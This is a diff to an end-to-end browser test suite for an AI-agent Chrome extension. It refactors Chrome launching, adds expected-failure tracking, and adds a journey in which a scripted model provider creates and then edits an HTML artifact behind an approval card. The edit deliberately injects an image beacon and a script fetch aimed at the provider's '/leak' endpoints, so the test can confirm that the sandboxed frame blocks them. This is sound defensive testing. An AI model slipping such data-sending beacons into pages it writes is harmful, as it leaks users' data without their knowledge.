@@ -27,6 +27,8 @@ const RM = "/bin/rm";
 const GIT = "/usr/bin/git";
 
 import { DEMO_STREAM_ANSWER } from "../extension/lib/models/demo-model.js";
+import { launchChrome as spawnChrome } from "./lib/chrome-launch.ts";
+import { SCRIPTED_DUMMY_KEY, selectionRefOf, startScriptedProvider } from "./lib/scripted-provider.ts";
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
 function withTimeout<T>(p: Promise<T>, ms: number, label: string): Promise<T> {
@@ -82,8 +84,12 @@ async function sha256Hex(bytes) {
     .join("");
 }
 
-function launchChrome(profile: string) {
-  return new Deno.Command(CHROMIUM, {
+/** The browser: the shared launcher owns the spawn (kernel-assigned port, the
+ * endpoint read from this child's own stderr, an honest error when none is
+ * printed) — CAP-FB-20260830-SUITE-HONESTY-01 folded the private copy here. */
+function launchJourneyChrome(profile: string) {
+  return spawnChrome({
+    binary: CHROMIUM,
     args: [
       "--headless=new",
       "--no-sandbox",
@@ -92,29 +98,14 @@ function launchChrome(profile: string) {
       "--silent-debugger-extension-api",
       `--disable-extensions-except=${EXT}`,
       `--load-extension=${EXT}`,
-      "--remote-debugging-port=0",
       "--window-size=1400,2400",
       `--user-data-dir=${profile}`,
       "about:blank",
     ],
-    stdout: "piped",
-    stderr: "piped",
+    stdout: "null",
     clearEnv: true,
-  }).spawn();
-}
-
-async function waitForPort(proc: Deno.ChildProcess): Promise<number> {
-  for (let i = 0; i < 80; i++) {
-    await sleep(250);
-    const reader = proc.stderr.getReader();
-    const { value, done } = await reader.read();
-    reader.releaseLock();
-    const line = done ? null : new TextDecoder().decode(value);
-    if (line?.includes("DevTools listening")) {
-      return Number(line.match(/ws:\/\/127\.0\.0\.1:(\d+)/)?.[1] ?? 0);
-    }
-  }
-  throw new Error("chrome did not expose a DevTools port");
+    timeoutMs: 20000,
+  });
 }
 
 // A minimal CDP session over the browser WebSocket. Protocol errors REJECT
@@ -405,9 +396,25 @@ async function captureShot(cdp, session) {
 // ---- fixed assertion set (every expected check is unconditional + named) ----
 const results = [];
 const ran = new Set();
+// Known failures OWNED by another tracker entry (CAP-FB-20260830-SUITE-HONESTY-01):
+// name → owning CAP-FB id. Such a check still runs and is printed as
+// EXPECTED-RED with its owner on every run; it is not counted as a failure,
+// and the run FAILS the moment it passes so the entry is pruned. Never a skip.
+const EXPECTED_RED = new Map<string, string>([]);
 function check(name, cond) {
   if (ran.has(name)) throw new Error(`duplicate assertion: ${name}`);
   ran.add(name);
+  const owner = EXPECTED_RED.get(name);
+  if (owner && !cond) {
+    results.push({ name, pass: false, expectedRed: owner });
+    console.log(`EXPECTED-RED (${owner}): ${name}`);
+    return;
+  }
+  if (owner && cond) {
+    results.push({ name, pass: false, unexpectedGreen: owner });
+    console.log(`UNEXPECTED-GREEN: ${name} — now passes; remove it from EXPECTED_RED (${owner})`);
+    return;
+  }
   results.push({ name, pass: !!cond });
   console.log(`${cond ? "PASS" : "FAIL"}: ${name}`);
 }
@@ -594,6 +601,10 @@ const EXPECTED = [
   "Thread view: run banner visible 300 ms after send",
   "Thread view: no empty panel space below a two-turn thread at 1440x900",
   "Thread view: conversation scrolled to bottom after an edit turn",
+  "Scripted provider: turn 1 creates the artifact through the real provider path (4 model calls incl. the nudge reply, selectionRef round trip)",
+  "Scripted provider: turn 2 pauses on the approval card naming the artifact with a diff",
+  "Scripted provider: the approved edit lands as version 2 with the final text",
+  "Scripted provider: the sandboxed artifact frame never reaches the provider origin (zero leak hits)",
   "Plan strip: a running multi-step task shows an advancing checklist pinned to the top of the thread",
   "Plan strip: on done it settles into a collapsed 'N steps' summary with every step checked",
   "Every item: 12 fixture tabs are read with ONE read_page search — 12 execute_tool reads, 0 selection-replayed",
@@ -875,7 +886,7 @@ async function writeEvidence(name, bytes) {
 async function main() {
   const profile = `/home/paulkinlan/.cache/cap-review/j2-${Date.now()}`;
   await Deno.mkdir(EVIDENCE_DIR, { recursive: true }).catch(() => {});
-  const proc = launchChrome(profile);
+  let proc: Deno.ChildProcess | null = null;
   let port;
   let ws;
   let cdp;
@@ -954,7 +965,13 @@ async function main() {
   let fixtureShutdownFailed = false;
 
   try {
-    port = await withTimeout(waitForPort(proc), 20000, "wait for port");
+    // The launcher bounds both phases itself: the serialized-Chrome lock wait
+    // (queued behind another lane's browser, printed when it happens) and the
+    // 20 s wait for this child's own DevTools endpoint.
+    const launched = await launchJourneyChrome(profile);
+    proc = launched.proc;
+    port = launched.port;
+    if (launched.lockWaitMs > 0) console.log(`chrome journeys: queued ${launched.lockWaitMs} ms for the serialized-Chrome lock`);
 
     const version = await fetchJson(`http://127.0.0.1:${port}/json/version`);
     ws = new WebSocket(version.webSocketDebuggerUrl);
@@ -996,6 +1013,22 @@ async function main() {
         }
       })();
     };
+    // The INITIAL worker must be running before auto-attach is armed. The
+    // shared launcher hands back the endpoint ~100 ms after spawn — faster
+    // than the old 250 ms stderr poll — which is early enough that arming
+    // waitForDebuggerOnStart here pauses the extension's FIRST boot; a worker
+    // paused at its first boot and then closed by Journey 0 never answers the
+    // page's wake (measured with a probe: raw spawn 164 ms, launcher 15 s
+    // timeout, deterministic; waiting for the running worker first restores the
+    // 164 ms). Journey 0 exists to restart a RUNNING worker so its boot is
+    // observed under auto-attach — so wait for the running one, explicitly,
+    // instead of relying on how long a handshake happens to take
+    // (CAP-FB-20260830-SUITE-HONESTY-01).
+    for (let i = 0; i < 100; i++) {
+      const targets = await fetchJson(`http://127.0.0.1:${port}/json/list`);
+      if (targets.find((t) => t.type === "service_worker")) break;
+      await sleep(100);
+    }
     const autoAttachRes = await cdp.send("Target.setAutoAttach", {
       autoAttach: true,
       waitForDebuggerOnStart: true,
@@ -4658,6 +4691,131 @@ async function main() {
     await sleep(200);
 
     // ─────────────────────────────────────────────────────────────
+    // JOURNEY 3e2 — CAP-FB-20260830-SUITE-HONESTY-01: the two-turn artifact
+    // chain through the REAL provider path, keyless. A scripted
+    // OpenAI-compatible provider (scripts/lib/scripted-provider.ts, loopback
+    // only) plays the model: turn 1 search_tools → execute_tool(create_asset)
+    // → text; turn 2 search_tools → execute_tool(update_asset) → text, with the
+    // edit paused on the owner's approval card. This exercises the HTTP
+    // adapter, the streamed tool-call deltas, the lazy protocol's selectionRef
+    // round trip, the approval gate and immutable versions without a key —
+    // and the edited page carries an exfil probe aimed at the provider's own
+    // origin, which the sandboxed artifact frame must never reach.
+    // ─────────────────────────────────────────────────────────────
+    const crumbV1 = await Deno.readTextFile(`${ROOT}tests/fixtures/crumb-v1.html`);
+    const crumbV2 = await Deno.readTextFile(`${ROOT}tests/fixtures/crumb-v2.html`);
+    let scriptedAssetId = "";
+    // Four model calls per turn: search → execute → the answer → the reply to
+    // agent-do's synthetic "Continue working on the task…" nudge (hidden by
+    // the run-text tracker, never persisted). The script mirrors that exactly
+    // so an extra or missing call shows up as an overflow / a short count.
+    const scripted = await startScriptedProvider({
+      steps: [
+        { tool: "search_tools", args: { query: "create_asset", limit: 1 } },
+        { tool: "execute_tool", args: (req) => ({ selectionRef: selectionRefOf(req), arguments: { origin: "master", name: "crumb-scripted.html", type: "html", content: crumbV1 } }) },
+        { text: "Created crumb-scripted.html." },
+        { text: "Created crumb-scripted.html." }, // the nudge reply
+        { tool: "search_tools", args: { query: "update_asset", limit: 1 } },
+        { tool: "execute_tool", args: (req) => ({ selectionRef: selectionRefOf(req), arguments: { origin: "master", id: scriptedAssetId, content: crumbV2.replace("</main>", `<img src="${scripted.baseURL}/leak?d=crumb" alt=""><script>fetch("${scripted.baseURL}/leak-fetch").catch(() => {});</script></main>`) } }) },
+        { text: "Updated crumb-scripted.html with opening hours." },
+        { text: "Updated crumb-scripted.html with opening hours." }, // the nudge reply
+      ],
+    });
+    try {
+      await msgOpts({
+        type: "provider.set",
+        config: { provider: "openai-compatible", baseURL: scripted.baseURL, apiKey: SCRIPTED_DUMMY_KEY, model: "scripted" },
+      });
+      const assetsBefore = new Set(((await msgValue({ type: "asset.list", origin: "master" }))?.assets ?? []).map((a) => a?.id));
+      await driveHubTask("build a crumb bakery page");
+      const turn1 = await settledThread(45000);
+      const assetsAfter = (await msgValue({ type: "asset.list", origin: "master" }))?.assets ?? [];
+      const createdAsset = assetsAfter.find((a) => a?.name === "crumb-scripted.html" && !assetsBefore.has(a?.id)) ?? null;
+      scriptedAssetId = createdAsset?.id ?? "";
+      const t1Shot = await captureShot(cdp, ntpSession);
+      if (t1Shot) await writeEvidence("journey-crumb-turn1.png", t1Shot);
+      console.log(`scripted provider (turn 1): requests=${scripted.requests.length} tools=${JSON.stringify(scripted.requests.map((r) => r.toolNames))} overflow=${scripted.overflow} asset=${scriptedAssetId} cards=${JSON.stringify(turn1?.artifactCards)}`);
+      check(
+        "Scripted provider: turn 1 creates the artifact through the real provider path (4 model calls incl. the nudge reply, selectionRef round trip)",
+        scripted.requests.length === 4 && scripted.overflow === 0 &&
+          scripted.requests.every((r) => r.stream === true && r.toolNames.includes("search_tools") && r.toolNames.includes("execute_tool")) &&
+          !!scriptedAssetId && Array.isArray(turn1?.artifactCards) && turn1.artifactCards.some((c) => c.name === "crumb-scripted.html" && c.kind === "html-frame"),
+      );
+      // Turn 2 — the edit through the THREAD composer; the update pauses on
+      // the approval card (name + "+n -m" + the diff), approved with a genuine click.
+      await cdp.send("Target.activateTarget", { targetId: ntpPage.id }).catch(() => {});
+      await typeInto(cdp, ntpSession, "#thread-composer #task-input", "add the opening hours");
+      await clickSel(cdp, ntpSession, "#thread-composer #run-task");
+      let scriptedApproval = null;
+      let scriptedApproved = false;
+      {
+        const t0 = Date.now();
+        while (Date.now() - t0 < 30000 && !scriptedApproved) {
+          const pending = await evalIn(cdp, ntpSession, `(() => !![...document.querySelectorAll('#thread-conversation approval-card')].find((x) => (x.getAttribute('state') || 'pending') === 'pending'))()`).catch(() => false);
+          if (pending === true) {
+            const dt0 = Date.now();
+            while (Date.now() - dt0 < 6000) {
+              scriptedApproval = JSON.parse((await evalIn(cdp, ntpSession, APPROVAL_DIFF_PROBE).catch(() => "null")) ?? "null");
+              if (scriptedApproval && scriptedApproval.hasDiff && scriptedApproval.addRows.length > 0) break;
+              await sleep(200);
+            }
+            const shot = await captureShot(cdp, ntpSession);
+            if (shot) await writeEvidence("journey-crumb-turn2-approval.png", shot);
+            scriptedApproved = await clickShadow(cdp, ntpSession, "#thread-conversation approval-card", ".approve");
+            break;
+          }
+          await sleep(250);
+        }
+      }
+      console.log(`scripted provider (turn 2): approval=${JSON.stringify(scriptedApproval)?.slice(0, 300)} approved=${scriptedApproved}`);
+      check(
+        "Scripted provider: turn 2 pauses on the approval card naming the artifact with a diff",
+        !!scriptedApproval && /Update crumb-scripted\.html\? \(\+\d+ -\d+\)/.test(String(scriptedApproval.title)) &&
+          scriptedApproval.hasDiff === true && scriptedApproval.addRows.some((t) => /Opening hours/.test(String(t))) && scriptedApproved,
+      );
+      const turn2 = await settledThread(45000);
+      // The hidden nudge reply is the loop's last call and lands a beat after
+      // the visible answer settles the thread — and while it is in flight the
+      // run banner shows "Working — thinking…" again. Wait for the call
+      // (bounded), then for the thread to settle a second time.
+      for (let i = 0; i < 40 && scripted.requests.length < 8; i++) await sleep(250);
+      await settledThread(20000);
+      const scriptedVersions = scriptedAssetId ? await msgValue({ type: "asset.versions", origin: "master", id: scriptedAssetId }) : null;
+      // The answer is re-projected into the thread from the durable log a beat
+      // after the run ends; poll for it (bounded) rather than reading once.
+      let finalText = "";
+      for (let i = 0; i < 40; i++) {
+        finalText = String(await evalIn(cdp, ntpSession, THREAD_TEXT("#thread-conversation")).catch(() => ""));
+        if (/Updated crumb-scripted\.html with opening hours/.test(finalText)) break;
+        await sleep(250);
+      }
+      const turn2After = await threadState() ?? turn2;
+      console.log(`scripted provider (turn 2 settled): requests=${scripted.requests.length} versions=${(scriptedVersions?.versions ?? []).length} overflow=${scripted.overflow} leaks=${JSON.stringify(scripted.leakHits)} status=${JSON.stringify(turn2After?.status)} text=${JSON.stringify(String(finalText).slice(-260))}`);
+      check(
+        "Scripted provider: the approved edit lands as version 2 with the final text",
+        scripted.requests.length === 8 && scripted.overflow === 0 && scriptedVersions?.ok === true &&
+          (scriptedVersions.versions ?? []).length === 2 && /Updated crumb-scripted\.html with opening hours/.test(String(finalText)) &&
+          turn2After != null && !(turn2After.status ?? []).some((r) => ["queued", "running", "retrying"].includes(r.state)),
+      );
+      // The updated page carries an <img> and a fetch aimed at the provider's
+      // origin. Its preview renders in the thread's sandboxed frame; wait for a
+      // settle and require that the provider saw nothing but API calls.
+      await sleep(2500);
+      check(
+        "Scripted provider: the sandboxed artifact frame never reaches the provider origin (zero leak hits)",
+        scripted.leakHits.length === 0 && scripted.requests.length === 8,
+      );
+      // Leave the store the way the later journeys expect it.
+      for (const row of ((await msgOpts({ type: "management.pending-approvals" }).catch(() => null))?.approvals ?? [])) {
+        if (row?.approvalId) await msgOpts({ type: "management.resolve-approval", approvalId: row.approvalId, approve: false }).catch(() => null);
+      }
+      if (scriptedAssetId) await msgOpts({ type: "asset.delete", origin: "master", id: scriptedAssetId }).catch(() => null);
+    } finally {
+      await msgOpts({ type: "provider.set", config: { provider: "demo", apiKey: "" } }).catch(() => null);
+      await scripted.close();
+    }
+
+    // ─────────────────────────────────────────────────────────────
     // JOURNEY 3f — CAP-FB-20260830-PLAN-STRIP-CHECKPOINTS-01: a running
     // multi-step task shows a compact plan strip pinned to the top of the
     // thread — its tool calls as a checklist, the current step ACTIVE and
@@ -7167,7 +7325,7 @@ async function main() {
     let removed = false;
     let clean = true;
     try {
-      await killChromiumTree(proc, profile);
+      if (proc) await killChromiumTree(proc, profile);
       await runBounded(RM, ["-rf", profile]);
       removed = !(await Deno.stat(profile).then(() => true).catch(() => false));
       if (removed) {
@@ -7229,9 +7387,11 @@ async function main() {
     }
     check("assertion order matches EXPECTED", orderOk);
 
-    const failed = results.filter((r) => !r.pass).length;
+    const expectedRed = results.filter((r) => r.expectedRed).length;
+    const failed = results.filter((r) => !r.pass && !r.expectedRed).length;
     console.log(
-      `\nchrome journeys: ${results.length - failed}/${results.length} passed`,
+      `\nchrome journeys: ${results.length - failed - expectedRed}/${results.length} passed` +
+        (expectedRed > 0 ? `, ${expectedRed} expected-red (owned: ${[...new Set(results.filter((r) => r.expectedRed).map((r) => r.expectedRed))].join(", ")})` : ""),
     );
 
     // Evidence manifest (RETAIN only, fatal): the SOURCE commit the evidence
@@ -7388,7 +7548,7 @@ async function demoPathJourney() {
   const shop = demoFixture("Shop");
   const DOCS = `http://127.0.0.1:${docs.addr.port}`;
   const SHOP = `http://127.0.0.1:${shop.addr.port}`;
-  const proc = launchChrome(profile);
+  let proc: Deno.ChildProcess | null = null;
   let ws = null;
   let cdp = null;
   // Every check is reported exactly once, whatever fails — a thrown step FAILS
@@ -7400,7 +7560,10 @@ async function demoPathJourney() {
   const STEP4_NAME = "demo-path: step 4 hub shows the scheduled run summary";
   const STEP5_NAME = "demo-path: step 5 artifact renders in the thread";
   try {
-    const port = await withTimeout(waitForPort(proc), 20000, "demo-path: wait for port");
+    // The shared launcher bounds the lock wait and the endpoint wait itself.
+    const launched = await launchJourneyChrome(profile);
+    proc = launched.proc;
+    const port = launched.port;
     const version = await fetchJson(`http://127.0.0.1:${port}/json/version`);
     ws = new WebSocket(version.webSocketDebuggerUrl);
     await withTimeout(new Promise((r) => ws.onopen = r), 5000, "demo-path: ws open");
@@ -7695,7 +7858,7 @@ async function demoPathJourney() {
     try { if (cdp) cdp.intentionalClose = true; ws?.close(); } catch { /* ignore */ }
     await Promise.all([docs.shutdown(), shop.shutdown()].map((p) => withTimeout(p, 8000, "demo-path fixture.shutdown").catch(() => { demoPathLeak = true; })));
     try {
-      await killChromiumTree(proc, profile);
+      if (proc) await killChromiumTree(proc, profile);
       await runBounded(RM, ["-rf", profile]);
       if (await Deno.stat(profile).then(() => true).catch(() => false)) demoPathLeak = true;
     } catch (e) {
